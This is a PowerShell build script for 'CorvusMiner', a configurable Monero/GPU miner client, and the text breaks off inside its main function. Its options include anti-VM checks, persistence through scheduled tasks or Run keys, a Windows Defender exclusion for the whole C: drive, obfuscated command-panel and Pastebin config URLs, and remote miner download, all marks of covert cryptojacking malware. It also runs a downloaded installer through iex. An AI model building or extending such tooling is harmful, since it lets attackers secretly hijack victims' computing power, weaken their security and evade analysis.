#Requires -Version 5.0
<#
.SYNOPSIS
    CorvusMiner Client Builder - Full interactive build script matching Go builder
.DESCRIPTION
    This script builds the CorvusMiner Client with full configuration support.
    It automatically installs CMake and MinGW if needed.
    Uses MinGW compiler instead of Visual Studio - no need for customers to download VS.
.EXAMPLE
    .\build.ps1
.EXAMPLE
    .\build.ps1 -panel_url "https://panel.example.com" -antivm $true
#>

param(
    [string]$panel_url = "",
    [string]$config_url = "",
    [bool]$smart_contract = $false,
    [string]$contract_address = "",
    [bool]$antivm = $false,
    [bool]$persistence = $false,
    [bool]$debug_console = $false,
    [bool]$admin_manifest = $false,
    [bool]$defender_exclusion = $false,
    [bool]$cpu_miner = $true,
    [bool]$gpu_miner = $false,
    [bool]$remote_miners = $false,
    [string]$panel_config = "",
    [string]$source_dir = "",
    [string]$output_dir = "",
    [string]$output_name = "",
    [int]$jobs = 4,
    [switch]$json,
    [switch]$keep_build
)

# ============================================================================
# Panel (non-interactive) mode state
# ============================================================================
$script:PanelJsonMode = $false
$script:BuildTail = New-Object System.Collections.Generic.Queue[string]

function Write-PanelLog {
    param([string]$Message)
    [Console]::Error.WriteLine($Message)
}

function Add-BuildTail {
    param([string]$Line)
    $script:BuildTail.Enqueue($Line)
    while ($script:BuildTail.Count -gt 60) { [void]$script:BuildTail.Dequeue() }
}

# ============================================================================
# Logging Functions (define early)
# ============================================================================
function Write-LogInfo {
    param([string]$Message)
    if ($script:PanelJsonMode) { Write-PanelLog "[INFO] $Message"; return }
    Write-Host "[INFO] $Message" -ForegroundColor Cyan
}

function Write-LogSuccess {
    param([string]$Message)
    if ($script:PanelJsonMode) { Write-PanelLog "[SUCCESS] $Message"; return }
    Write-Host "[SUCCESS] $Message" -ForegroundColor Green
}

function Write-LogError {
    param([string]$Message)
    if ($script:PanelJsonMode) { Write-PanelLog "[ERROR] $Message"; return }
    Write-Host "[ERROR] $Message" -ForegroundColor Red
}

function Write-LogWarning {
    param([string]$Message)
    if ($script:PanelJsonMode) { Write-PanelLog "[WARNING] $Message"; return }
    Write-Host "[WARNING] $Message" -ForegroundColor Yellow
}

function Write-Header {
    param([string]$Message)
    if ($script:PanelJsonMode) { Write-PanelLog "=== $Message ==="; return }
    Write-Host "`n================== $Message ==================`n" -ForegroundColor Cyan
}

# ============================================================================
# Helper Functions (define early)
# ============================================================================
function Prompt-YesNo {
    param(
        [string]$Question,
        [bool]$Default = $false
    )
    $defaultStr = if ($Default) { "(y/n) [default: y]" } else { "(y/n) [default: n]" }
    Write-Host "$Question $defaultStr " -NoNewline
    $response = Read-Host
    
    if ($response -eq "") {
        return $Default
    }
    return $response -eq "y" -or $response -eq "Y"
}

# ============================================================================
# Check Dependencies First (no admin needed)
# ============================================================================
if (-not $panel_config) {
$hasCMake = $null -ne (Get-Command cmake -ErrorAction SilentlyContinue)
$hasMinGW = $null -ne (Get-Command g++ -ErrorAction SilentlyContinue)

if ($hasCMake -and $hasMinGW) {
    Write-LogSuccess "All dependencies found - proceeding without admin elevation"
} else {
    # Dependencies missing - request admin
    Write-LogWarning "Missing dependencies (CMake or MinGW)"
    Write-Host "Requesting administrator privileges to install..." -ForegroundColor Yellow
    
    # Build arguments string from params
    $args = @()
    if ($panel_url) { $args += "-panel_url '$panel_url'" }
    if ($config_url) { $args += "-config_url '$config_url'" }
    if ($smart_contract) { $args += "-smart_contract `$true" }
    if ($contract_address) { $args += "-contract_address '$contract_address'" }
    if ($antivm) { $args += "-antivm `$true" }
    if ($persistence) { $args += "-persistence `$true" }
    if ($debug_console) { $args += "-debug_console `$true" }
    if ($admin_manifest) { $args += "-admin_manifest `$true" }
    if ($defender_exclusion) { $args += "-defender_exclusion `$true" }
    if (-not $cpu_miner) { $args += "-cpu_miner `$false" }
    if ($gpu_miner) { $args += "-gpu_miner `$true" }
    if ($remote_miners) { $args += "-remote_miners `$true" }
    
    $argString = $args -join " "
    
    # Request elevation
    Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $argString" -Verb RunAs
    exit
}
}

$ErrorActionPreference = 'Stop'
if ($panel_config) {
    $WarningPreference = 'SilentlyContinue'
    $ProgressPreference = 'SilentlyContinue'
} else {
    $WarningPreference = 'Continue'
}

# ============================================================================
# Dependency Management
# ============================================================================
function Install-ChocoIfMissing {
    $chocoPath = "C:\ProgramData\chocolatey\bin\choco.exe"
    
    if (Test-Path $chocoPath) {
        Write-LogSuccess "Chocolatey already installed"
        return
    }
    
    Write-LogWarning "Installing Chocolatey..."
    $ProgressPreference = 'SilentlyContinue'
    Set-ExecutionPolicy Bypass -Scope Process -Force
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    
    try {
        iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
        # Refresh PATH
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
        Write-LogSuccess "Chocolatey installed successfully"
    }
    catch {
        Write-LogError "Failed to install Chocolatey: $_"
        exit 1
    }
}

function Ensure-CMake {
    if ($null -ne (Get-Command cmake -ErrorAction SilentlyContinue)) {
        $version = cmake --version | Select-Object -First 1
        Write-LogSuccess "CMake found: $version"
        return
    }
    
    Write-LogWarning "Installing CMake via Chocolatey..."
    $chocoPath = "C:\ProgramData\chocolatey\bin\choco.exe"
    
    if (-not (Test-Path $chocoPath)) {
        Write-LogError "Chocolatey not found at $chocoPath"
        exit 1
    }
    
    & "$chocoPath" install cmake -y
    
    if ($LASTEXITCODE -ne 0) {
        Write-LogError "Failed to install CMake"
        exit 1
    }
    
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
    Write-LogSuccess "CMake installed successfully"
}

function Ensure-MinGW {
    if ($null -ne (Get-Command g++ -ErrorAction SilentlyContinue)) {
        $version = g++ --version | Select-Object -First 1
        Write-LogSuccess "MinGW found: $version"
        return
    }
    
    Write-LogWarning "Installing MinGW 64-bit toolchain via Chocolatey (~200MB)..."
    $chocoPath = "C:\ProgramData\chocolatey\bin\choco.exe"
    
    if (-not (Test-Path $chocoPath)) {
        Write-LogError "Chocolatey not found at $chocoPath"
        exit 1
    }
    
    & "$chocoPath" install mingw -y
    
    if ($LASTEXITCODE -ne 0) {
        Write-LogError "Failed to install MinGW"
        exit 1
    }
    
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
    Write-LogSuccess "MinGW 64-bit toolchain installed successfully"
}

# ============================================================================
# File Modification Functions (matching Go builder)
# ============================================================================
function Backup-SourceFiles {
    param([string]$ClientDir)
    
    $backupDir = Join-Path $ClientDir "backup"
    if (Test-Path $backupDir) {
        Remove-Item $backupDir -Recurse -Force | Out-Null
    }
    New-Item -ItemType Directory -Path $backupDir | Out-Null
    
    $srcDir = Join-Path $ClientDir "src"
    Copy-Item $srcDir -Destination (Join-Path $backupDir "src") -Recurse -Force | Out-Null
    Write-LogInfo "Backed up source files to $backupDir"
}

function Restore-SourceFiles {
    param([string]$ClientDir)
    
    $backupDir = Join-Path $ClientDir "backup"
    $srcDir = Join-Path $ClientDir "src"
    
    if (Test-Path $backupDir) {
        Remove-Item $srcDir -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
        Copy-Item (Join-Path $backupDir "src") -Destination $srcDir -Recurse -Force | Out-Null
        Write-LogInfo "Restored original source files from backup"
    }
}

function Modify-PanelURL {
    param(
        [string]$MainCppPath,
        [string]$PanelURL
    )
    
    if ([string]::IsNullOrEmpty($MainCppPath)) {
        Write-LogError "Main.cpp path is empty"
        throw "Invalid path for main.cpp"
    }
    
    if (-not (Test-Path $MainCppPath)) {
        Write-LogWarning "File not found: $MainCppPath - URL modification skipped"
        return
    }
    
    try {
        $content = Get-Content -LiteralPath $MainCppPath -Raw -ErrorAction Stop
        
        # Simple direct string replacement for panelUrlsStr
        # Match: std::string panelUrlsStr = OBFUSCATE_STRING("...");
        $oldPattern = 'std::string panelUrlsStr = OBFUSCATE_STRING\("http://127\.0\.0\.1:8080/api/miners/submit"\);'
        $newPattern = "std::string panelUrlsStr = OBFUSCATE_STRING(`"$PanelURL`");"
        
        if ($content -match [regex]::Escape($oldPattern)) {
            $content = $content -replace [regex]::Escape($oldPattern), $newPattern
            Set-Content -LiteralPath $MainCppPath -Value $content -NoNewline -ErrorAction Stop
            Write-LogInfo "Modified panel URL in main.cpp"
            Write-LogInfo "New panel URL: $PanelURL"
        }
        else {
            # If exact pattern doesn't match, try more flexible pattern
            $flexPattern = 'std::string\s+panelUrlsStr\s*=\s*OBFUSCATE_STRING\s*\(\s*"[^"]+"\s*\)\s*;'
            if ($content -match $flexPattern) {
                $content = $content -replace $flexPattern, "std::string panelUrlsStr = OBFUSCATE_STRING(`"$PanelURL`");"
                Set-Content -LiteralPath $MainCppPath -Value $content -NoNewline -ErrorAction Stop
                Write-LogInfo "Modified panel URL in main.cpp (flexible match)"
            }
            else {
                Write-LogWarning "Could not find panel URL pattern in main.cpp"
            }
        }
    }
    catch {
        Write-LogError "Failed to modify main.cpp: $_"
        throw
    }
}

function Modify-ConfigGetURL {
    param(
        [string]$MainCppPath,
        [string]$ConfigURL
    )
    
    if ([string]::IsNullOrEmpty($MainCppPath)) {
        Write-LogError "Main.cpp path is empty"
        throw "Invalid path for main.cpp"
    }
    
    if (-not (Test-Path $MainCppPath)) {
        Write-LogWarning "File not found: $MainCppPath - URL modification skipped"
        return
    }
    
    try {
        $content = Get-Content -LiteralPath $MainCppPath -Raw -ErrorAction Stop
        
        # Simple direct string replacement for configGetUrlStr
        # Match: std::string configGetUrlStr = OBFUSCATE_STRING("");
        $oldPattern = 'std::string configGetUrlStr = OBFUSCATE_STRING\(""\);'
        $newPattern = "std::string configGetUrlStr = OBFUSCATE_STRING(`"$ConfigURL`");"
        
        if ($content -match [regex]::Escape($oldPattern)) {
            $content = $content -replace [regex]::Escape($oldPattern), $newPattern
            Set-Content -LiteralPath $MainCppPath -Value $content -NoNewline -ErrorAction Stop
            Write-LogInfo "Modified config GET URL in main.cpp"
            Write-LogInfo "New config URL: $ConfigURL"
        }
        else {
            # If exact pattern doesn't match, try more flexible pattern
            $flexPattern = 'std::string\s+configGetUrlStr\s*=\s*OBFUSCATE_STRING\s*\(\s*"[^"]*"\s*\)\s*;'
            if ($content -match $flexPattern) {
                $content = $content -replace $flexPattern, "std::string configGetUrlStr = OBFUSCATE_STRING(`"$ConfigURL`");"
                Set-Content -LiteralPath $MainCppPath -Value $content -NoNewline -ErrorAction Stop
                Write-LogInfo "Modified config GET URL in main.cpp (flexible match)"
            }
            else {
                Write-LogWarning "Could not find config GET URL pattern in main.cpp"
            }
        }
    }
    catch {
        Write-LogError "Failed to modify main.cpp: $_"
        throw
    }
}

function Validate-EmbeddedConfig {
    param([string]$ConfigPath)
    
    if (-not (Test-Path $ConfigPath)) {
        throw "Embedded config file not found: $ConfigPath"
    }
    
    try {
        $json = Get-Content $ConfigPath -Raw | ConvertFrom-Json
        Write-LogSuccess "Embedded config validated"
        return $true
    }
    catch {
        throw "Embedded config is not valid JSON: $_"
    }
}

# ============================================================================
# Build Configuration
# ============================================================================
function Get-BuildConfiguration {
    param([string]$ClientDir)
    
    Write-Header "CorvusMiner Client Builder"
    Write-LogInfo "MinGW + CMake - No Visual Studio Required"
    
    # Config method selection
    Write-LogInfo ""
    $useGetConfig = Prompt-YesNo "CONFIG METHOD - Fetch config from Pastebin/GET endpoint?"
    
    $config = @{
        UseGetConfig = $useGetConfig
        PanelURL = ""
        ConfigURL = ""
        EnableCPUMiner = $true
        EnableGPUMiner = $true
        EnableEmbeddedConfig = $false
        EmbeddedConfigPath = ""
        ProcessMonitoring = $false
        DebugConsole = $false
        AntiVM = $false
        Persistence = $false
        RemoteMiners = $false
        RequireAdmin = $false
        DefenderExclude = $false
    }
    
    if ($useGetConfig) {
        Write-LogInfo "PASTEBIN/GET CONFIG"
        Write-Host "Enter Pastebin raw URL or config endpoint(s) separated by commas for fallback:`n  Example: https://pastebin.com/raw/xXnRDDjH`n`nURL(s): " -NoNewline
        $config.ConfigURL = Read-Host
        
        if ($config.ConfigURL -eq "") {
            throw "Config URL cannot be empty when using GET method"
        }
        
        $urlCount = @($config.ConfigURL -split ",").Count
        Write-LogInfo "Using $urlCount config URL(s) with fallback support"
        
        Write-LogInfo "MINERS FOR PASTEBIN"
        $config.EnableCPUMiner = Prompt-YesNo "Include CPU miner (XMRig)?" -Default $true
        $config.EnableGPUMiner = Prompt-YesNo "Include GPU miner (GMiner)?" -Default $true
        
        if (-not $config.EnableCPUMiner -and -not $config.EnableGPUMiner) {
            throw "At least one miner must be enabled"
        }
        
        $config.EnableEmbeddedConfig = $true
        $projectRoot = Split-Path -Parent $ClientDir
        $config.EmbeddedConfigPath = Join-Path $projectRoot "embedded_config.json"
        
        if (Test-Path $config.EmbeddedConfigPath) {
            Write-LogInfo "Validating embedded config JSON..."
            Validate-EmbeddedConfig $config.EmbeddedConfigPath | Out-Null
        }
        else {
            Write-LogWarning "Embedded config not found at $($config.EmbeddedConfigPath)"
        }
    }
    else {
        Write-LogInfo "CONFIG METHOD: POST to Panel"
        Write-Host "Enter panel URL(s) separated by commas for fallback.`nINCLUDE /api/miners/submit at the end:`n  Example: http://127.0.0.1:8080/api/miners/submit`n`nURL(s): " -NoNewline
        $config.PanelURL = Read-Host
        
        if ($config.PanelURL -eq "") {
            throw "Panel URL cannot be empty when using POST method"
        }
        
        if ($config.PanelURL -notmatch "/api/miners/submit") {
            Write-LogWarning "URLs do not contain '/api/miners/submit' - this may cause the miner to fail!"
            if (-not (Prompt-YesNo "Continue anyway?")) {
                throw "Build cancelled by user"
            }
        }
        
        $urlCount = @($config.PanelURL -split ",").Count
        Write-LogInfo "Using $urlCount panel URL(s) with fallback support"
    }
    
    # Additional options
    Write-LogInfo "OPTIONS"
    $config.ProcessMonitoring = Prompt-YesNo "Enable process monitoring?"
    $config.DebugConsole = Prompt-YesNo "Enable debug console?"
    $config.AntiVM = Prompt-YesNo "Enable anti-VM detection?"
    $config.Persistence = Prompt-YesNo "Enable persistence (scheduled task or Run key)?"
    
    if (-not $useGetConfig) {
        $config.RemoteMiners = Prompt-YesNo "Download miners from panel instead of embedding?"
    }
    else {
        Write-LogInfo "Note: Remote miner loading is disabled (not available with GET config method)"
        $config.RemoteMiners = $false
    }
    
    $config.RequireAdmin = Prompt-YesNo "Require administrator privileges?"
    $config.DefenderExclude = Prompt-YesNo "Add C: drive to Windows Defender exclusion? [requires admin]"
    
    # Summary
    Write-LogInfo ""
    Write-LogInfo "BUILD CONFIGURATION SUMMARY"
    if ($useGetConfig) {
        Write-LogInfo "Config Method: GET request from Pastebin/endpoint"
        Write-LogInfo "Config URL(s): $($config.ConfigURL)"
        Write-LogInfo "CPU Miner (XMRig): $($config.EnableCPUMiner)"
        Write-LogInfo "GPU Miner (GMiner): $($config.EnableGPUMiner)"
        Write-LogInfo "Embedded Fallback Config: $($config.EnableEmbeddedConfig)"
    }
    else {
        Write-LogInfo "Config Method: POST to panel with system info"
        Write-LogInfo "Panel URL(s): $($config.PanelURL)"
    }
    Write-LogInfo "Process Monitoring: $($config.ProcessMonitoring)"
    Write-LogInfo "Debug Console: $($config.DebugConsole)"
    Write-LogInfo "Anti-VM Detection: $($config.AntiVM)"
    Write-LogInfo "Persistence: $($config.Persistence)"
    Write-LogInfo "Remote Miners: $($config.RemoteMiners)"
    Write-LogInfo "Require Admin: $($config.RequireAdmin)"
    Write-LogInfo "Windows Defender C: Exclusion: $($config.DefenderExclude)"
    
    return $config
}

# ============================================================================
# CMake Build
# ============================================================================
function Invoke-CmakeCommand {
    param(
        [string]$WorkingDirectory,
        [string[]]$Arguments,
        [string]$Label
    )

    Push-Location $WorkingDirectory
    try {
        & cmake @Arguments 2>&1 | ForEach-Object {
            $line = [string]$_
            Add-BuildTail $line
            if ($script:PanelJsonMode) { Write-PanelLog $line } else { Write-Host $line }
        }
        if ($LASTEXITCODE -ne 0) {
            throw "$Label failed with exit code $LASTEXITCODE"
        }
    }
    finally {
        Pop-Location
    }
}

function Invoke-ConfigureAndBuild {
    param(
        [string]$ClientDir,
        [hashtable]$Config,
        [int]$ParallelJobs = 4
    )

    $buildDir = Join-Path $ClientDir "build"

    Write-LogInfo "Cleaning build directory: $buildDir"
    if (Test-Path $buildDir) {
        Remove-Item $buildDir -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
        Start-Sleep -Milliseconds 500
    }
    if (-not (Test-Path $buildDir)) {
        New-Item -ItemType Directory -Path $buildDir -ErrorAction SilentlyContinue | Out-Null
    }

    # Locate mingw32-make so CMake can find the build program regardless of PATH state
    $makeCmd = Get-Command mingw32-make -ErrorAction SilentlyContinue
    $makeProgram = if ($makeCmd) { $makeCmd.Source } else { $null }
    if (-not $makeProgram) {
        # Chocolatey MinGW fallback path
        $makeProgram = "C:\ProgramData\chocolatey\lib\mingw\tools\install\mingw64\bin\mingw32-make.exe"
    }
    if (-not (Test-Path $makeProgram)) {
        # Last resort: search common MinGW locations
        $makeFound = Get-ChildItem "C:\mingw*","C:\msys*","C:\tools\mingw*" -Recurse -Filter "mingw32-make.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
        $makeProgram = if ($makeFound) { $makeFound.FullName } else { $null }
    }

    $cmakeArgs = @(
        "-G", "MinGW Makefiles",
        "-DCMAKE_BUILD_TYPE=Release",
        "-DCMAKE_C_COMPILER=gcc",
        "-DCMAKE_CXX_COMPILER=g++",
        "-DCMAKE_RC_COMPILER=windres"
    )
    if ($makeProgram -and (Test-Path $makeProgram)) {
        $cmakeArgs += "-DCMAKE_MAKE_PROGRAM=$makeProgram"
        Write-LogInfo "Using make: $makeProgram"
    }

    if ($Config.AntiVM) { $cmakeArgs += "-DENABLE_ANTIVM=ON" }
    if ($Config.Persistence) { $cmakeArgs += "-DENABLE_PERSISTENCE=ON" }
    if ($Config.DebugConsole) { $cmakeArgs += "-DENABLE_DEBUG_CONSOLE=ON" }

    if ($Config.RemoteMiners) {
        $cmakeArgs += "-DENABLE_REMOTE_MINERS=ON"
        # Also embed miners as fallback when remote download fails (panel offline)
        if ($Config.EnableCPUMiner) { $cmakeArgs += "-DENABLE_CPU_MINER=ON" }
        if ($Config.EnableGPUMiner) { $cmakeArgs += "-DENABLE_GPU_MINER=ON" }
    }
    else {
        if ($Config.EnableCPUMiner) { $cmakeArgs += "-DENABLE_CPU_MINER=ON" }
        if ($Config.EnableGPUMiner) { $cmakeArgs += "-DENABLE_GPU_MINER=ON" }
    }

    if ($Config.RequireAdmin) { $cmakeArgs += "-DENABLE_ADMIN_MANIFEST=ON" }
    if ($Config.DefenderExclude) { $cmakeArgs += "-DENABLE_DEFENDER_EXCLUSION=ON" }

    if ($Config.EnableEmbeddedConfig -and $Config.EmbeddedConfigPath) {
        $cmakeArgs += "-DENABLE_EMBEDDED_CONFIG=ON"
        $cmakeArgs += "-DEMBEDDED_CONFIG_JSON_INPUT=$($Config.EmbeddedConfigPath)"
    }
    elseif (-not $Config.UseGetConfig -and -not $Config.DisableAutoEmbeddedConfig) {
        # Legacy behaviour: auto-embed a config file found next to the script.
        $autoConfigPath = Join-Path $PSScriptRoot "embedded_config.json"
        if (-not (Test-Path $autoConfigPath)) {
            $autoConfigPath = Join-Path (Split-Path -Parent $PSScriptRoot) "embedded_config.json"
        }
        if (Test-Path $autoConfigPath) {
            Write-LogInfo "Panel mode: embedding fallback config from $autoConfigPath"
            $cmakeArgs += "-DENABLE_EMBEDDED_CONFIG=ON"
            $cmakeArgs += "-DEMBEDDED_CONFIG_JSON_INPUT=$autoConfigPath"
        }
    }

    if ($Config.DisableAutoEmbeddedConfig -and -not ($Config.EnableEmbeddedConfig -and $Config.EmbeddedConfigPath)) {
        # Point at a path that cannot exist so CMake's auto-detection of
        # Client/resources/embedded_config.json stays disabled.
        $cmakeArgs += "-DENABLE_EMBEDDED_CONFIG=OFF"
        $cmakeArgs += "-DEMBEDDED_CONFIG_JSON_INPUT=$([IO.Path]::Combine($buildDir, '.no-embedded-config.json'))"
    }

    if ($Config.ConfigURL) { $cmakeArgs += "-DCONFIG_GET_URL=$($Config.ConfigURL)" }

    if ($Config.SmartContract) {
        $cmakeArgs += "-DENABLE_CONTRACT_URL=ON"
        $cmakeArgs += "-DCONTRACT_ADDRESS=$($Config.ContractAddress)"
    }

    $cmakeArgs += ".."

    Write-LogInfo "Configuring project with CMake..."
    Invoke-CmakeCommand -WorkingDirectory $buildDir -Arguments $cmakeArgs -Label "CMake configuration"

    Write-LogInfo "Building project with MinGW..."
    Invoke-CmakeCommand -WorkingDirectory $buildDir -Arguments @("--build", ".", "--config", "Release", "--parallel", "$ParallelJobs") -Label "Build"

    Write-LogSuccess "Build completed successfully!"
    return (Join-Path $buildDir "corvus.exe")
}

function Invoke-CMakeBuild {
    param(
        [string]$ClientDir,
        [hashtable]$Config
    )

    # Backup source files
    Backup-SourceFiles $ClientDir

    try {
        # Modify source files based on configuration
        $srcDir = Join-Path $ClientDir "src"
        $mainCppPath = Join-Path $srcDir "main.cpp"

        if ($Config.SmartContract) {
            Write-LogInfo "Smart contract URL mode - skipping static URL injection"
            Write-LogInfo "Contract: $($Config.ContractAddress)"
        }
        elseif ($Config.UseGetConfig) {
            & Modify-ConfigGetURL -MainCppPath $mainCppPath -ConfigURL $Config.ConfigURL
        }
        else {
            & Modify-PanelURL -MainCppPath $mainCppPath -PanelURL $Config.PanelURL
        }

        $artifact = Invoke-ConfigureAndBuild -ClientDir $ClientDir -Config $Config -ParallelJobs 4
        Write-LogInfo "Output: $artifact"
    }
    finally {
        Restore-SourceFiles $ClientDir
    }
}

function Get-PanelEmbeddedConfig {
    param(
        [string]$RepoRoot,
        [string]$ClientDir,
        [string]$Setting
    )

    if ($Setting -eq "none" -or $Setting -eq "off" -or $Setting -eq "false") { return "" }

    if ($Setting -and $Setting -ne "auto") {
        if (-not (Test-Path -LiteralPath $Setting)) { throw "embedded config not found: $Setting" }
        try { Get-Content -LiteralPath $Setting -Raw | ConvertFrom-Json | Out-Null }
        catch { throw "embedded config is not valid JSON: $Setting" }
        return (Resolve-Path -LiteralPath $Setting).Path
    }

    $candidates = @(
        (Join-Path $RepoRoot "embedded_config.json"),
        (Join-Path (Join-Path $ClientDir "resources") "embedded_config.json"),
        (Join-Path (Split-Path -Parent $RepoRoot) "embedded_config.json")
    )
    foreach ($candidate in $candidates) {
        if (Test-Path -LiteralPath $candidate) {
            try { Get-Content -LiteralPath $candidate -Raw | ConvertFrom-Json | Out-Null }
            catch { throw "embedded config is not valid JSON: $candidate" }
            return (Resolve-Path -LiteralPath $candidate).Path
        }
    }
    return ""
}

# Non-interactive build entry point used by the panel on Windows.
# Reads a JSON build spec, stages the sources, builds with MinGW and prints one
# JSON result document on stdout (progress goes to stderr).
function Invoke-PanelBuild {
    param(
        [string]$ConfigPath,
        [string]$SourceDir,
        [string]$OutputDir,
        [string]$OutputName,
        [int]$ParallelJobs = 4,
        [switch]$KeepBuild
    )

    $started = Get-Date
    $result = [ordered]@{
        success = $false
        output = ""
        bytes = 0
        sha256 = ""
        duration_ms = 0
        build_dir = ""
        warnings = @()
        error = ""
        config = $null
    }
    $warnings = New-Object System.Collections.Generic.List[string]
    $stage = $null

    try {
        if (-not (Test-Path -LiteralPath $ConfigPath)) { throw "panel config file not found: $ConfigPath" }
        $spec = Get-Content -LiteralPath $ConfigPath -Raw | ConvertFrom-Json
        $result.config = $spec

        $panelUrls = [string]$spec.panel_urls
        $configUrl = [string]$spec.config_url
        $contract = [string]$spec.contract_address

        if (-not $panelUrls -and -not $configUrl -and -not $contract) {
            throw "no config source: panel_urls, config_url or contract_address is required"
        }
        if ($contract -and $configUrl) { throw "contract_address and config_url are mutually exclusive" }
        if ($contract -and ($contract -notmatch '^0x[0-9a-fA-F]{40}$')) { throw "invalid contract address: $contract" }

        $cpu = $true
        if ($null -ne $spec.cpu_miner) { $cpu = [bool]$spec.cpu_miner }
        $gpu = $false
        if ($null -ne $spec.gpu_miner) { $gpu = [bool]$spec.gpu_miner }
        $remote = [bool]$spec.remote_miners
        if (-not $cpu -and -not $gpu -and -not $remote) {
            throw "no miner selected: enable cpu_miner, gpu_miner or remote_miners"
        }
        if ([bool]$spec.process_monitoring) {
            $warnings.Add("process monitoring is applied from panel config at runtime; process_monitoring has no compile-time effect")
        }

        $clientDir = ""
        if ($SourceDir) { $clientDir = $SourceDir }
        elseif ($spec.source) { $clientDir = [string]$spec.source }
        if (-not $clientDir) {
            $repoRoot = Split-Path -Parent $PSScriptRoot
            $clientDir = Join-Path $repoRoot "Client"
        }
        $clientDir = (Resolve-Path -LiteralPath $clientDir).Path
        if (-not (Test-Path (Join-Path $clientDir "CMakeLists.txt"))) {
            throw "Client source not found at: $clientDir"
        }
        $repoRoot = Split-Path -Parent $clientDir

        $missing = @()
        foreach ($tool in @("cmake", "gcc", "g++", "windres", "mingw32-make")) {
            if (-not (Get-Command $tool -ErrorAction SilentlyContinue)) { $missing += $tool }
        }
        if ($missing.Count -gt 0) {
            throw ("missing required tool(s): " + ($missing -join ", ") + " (install with: choco install cmake mingw -y)")
        }

        $resourcesDir = Join-Path $clientDir "resources"
        $xmrigPath = Join-Path $resourcesDir "xmrig.exe"
        $wildrigPath = Join-Path $resourcesDir "wildrig.exe"
        if ($cpu -and -not (Test-Path -LiteralPath $xmrigPath)) {
            throw "CPU miner resource not found: $xmrigPath"
        }
        if ($gpu -and -not (Test-Path -LiteralPath $wildrigPath)) {
            throw "GPU miner (WildRig) resource not found: $wildrigPath"
        }

        # Stage the sources so the repository is never modified by a panel build.
        $stage = Join-Path ([IO.Path]::GetTempPath()) ("corvus-build-" + [guid]::NewGuid().ToString("N"))
        $stageClient = Join-Path $stage "Client"
        Write-LogInfo "Staging sources in $stageClient"
        New-Item -ItemType Directory -Path $stage -Force | Out-Null
        Copy-Item -LiteralPath $clientDir -Destination $stageClient -Recurse -Force
        foreach ($skip in @("build", "backup", "dist")) {
            $junk = Join-Path $stageClient $skip
            if (Test-Path $junk) { Remove-Item $junk -Recurse -Force -ErrorAction SilentlyContinue }
        }

        $embeddedPath = Get-PanelEmbeddedConfig -RepoRoot $repoRoot -ClientDir $clientDir -Setting ([string]$spec.embedded_config)

        $config = @{
            UseGetConfig = ((-not $panelUrls) -and [bool]$configUrl)
            PanelURL = $panelUrls
            ConfigURL = $configUrl
            SmartContract = [bool]$contract
            ContractAddress = $contract
            AntiVM = [bool]$spec.anti_vm
            Persistence = [bool]$spec.persistence
            DebugConsole = [bool]$spec.debug_console
            AdminManifest = [bool]$spec.admin_manifest
            DefenderExclusion = [bool]$spec.defender_exclusion
            EnableCPUMiner = $cpu
            EnableGPUMiner = $gpu
            RemoteMiners = $remote
            RequireAdmin = [bool]$spec.admin_manifest
            EnableEmbeddedConfig = [bool]$embeddedPath
            EmbeddedConfigPath = $embeddedPath
            DisableAutoEmbeddedConfig = $true
        }

        $mainCppPath = Join-Path (Join-Path $stageClient "src") "main.cpp"
        if ($config.SmartContract) {
            Write-LogInfo "Smart contract URL mode - skipping static URL injection"
        }
        elseif ($config.UseGetConfig) {
            & Modify-ConfigGetURL -MainCppPath $mainCppPath -ConfigURL $config.ConfigURL
        }
        else {
            & Modify-PanelURL -MainCppPath $mainCppPath -PanelURL $config.PanelURL
        }
        if ($embeddedPath) { Write-LogInfo "Embedded fallback config: $embeddedPath" }

        $artifact = Invoke-ConfigureAndBuild -ClientDir $stageClient -Config $config -ParallelJobs $ParallelJobs
        if (-not (Test-Path -LiteralPath $artifact)) { throw "build artifact not found at: $artifact" }

        $destDir = ""
        if ($OutputDir) { $destDir = $OutputDir }
        elseif ($spec.output) { $destDir = [string]$spec.output }
        else { $destDir = Join-Path $repoRoot "dist" }
        $destName = "corvus.exe"
        if ($OutputName) { $destName = $OutputName }
        elseif ($spec.name) { $destName = [string]$spec.name }

        New-Item -ItemType Directory -Path $destDir -Force | Out-Null
        $dest = Join-Path $destDir $destName
        if (Test-Path -LiteralPath $dest) { Remove-Item -LiteralPath $dest -Force }
        Copy-Item -LiteralPath $artifact -Destination $dest -Force

        $result.output = (Resolve-Path -LiteralPath $dest).Path
        $result.bytes = (Get-Item -LiteralPath $dest).Length
        $result.sha256 = (Get-FileHash -LiteralPath $dest -Algorithm SHA256).Hash.ToLowerInvariant()
        $result.success = $true
        if ($KeepBuild) { $result.build_dir = $stage }
    }
    catch {
        $result.error = $_.Exception.Message
        if ($script:BuildTail.Count -gt 0) {
            $tail = ($script:BuildTail.ToArray() | Select-Object -Last 25) -join "`n"
            $result.error = $result.error + "`n--- last output ---`n" + $tail
        }
    }
    finally {
        if ($stage -and -not $KeepBuild) { Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue }
        $result.warnings = @($warnings.ToArray())
        $result.duration_ms = [int]((Get-Date) - $started).TotalMilliseconds
    }

    return $result
}

# ============================================================================
# Main Entry Point
# ============================================================================
function Main {
    if ($panel_config) {
        $script:PanelJsonMode = [bool]$json
        $res = Invoke-PanelBuild -ConfigPath $panel_config -SourceDir $source_dir -OutputDir $output_dir -OutputName $output_name -ParallelJobs $jobs -KeepBuild:$keep_build
        if ($json) {
            $res | ConvertTo-Json -Depth 8 -Compress
        }
        elseif ($res.success) {
            Write-Host "Built $($res.output)"
        }
        else {
            Write-Host "Build failed: $($res.error)"
        }
        if (-not $res.success) { exit 1 }
        exit 0
    }

    try {
        # Check admin rights
